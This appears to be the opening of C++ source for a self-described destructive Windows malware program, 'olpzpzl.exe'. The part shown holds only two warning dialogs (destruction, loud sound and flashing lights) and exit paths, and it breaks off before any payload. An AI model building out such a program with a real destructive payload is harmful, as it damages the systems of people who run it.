// olpzpzl.exe - a destructive malware made by VietNamLover.
// Do not run this malware on your real PC, run this malware only on VM!
...
{
	if (MessageBoxW(NULL, L"tHiS iS A dEStrUctIVe mALwaRE, rUn?", L"olpzpzl.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure - lUOd aNd fLaSHiNG liGhTS wArnInG?", L"olpzpzl.exe - lASt wARniNG", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
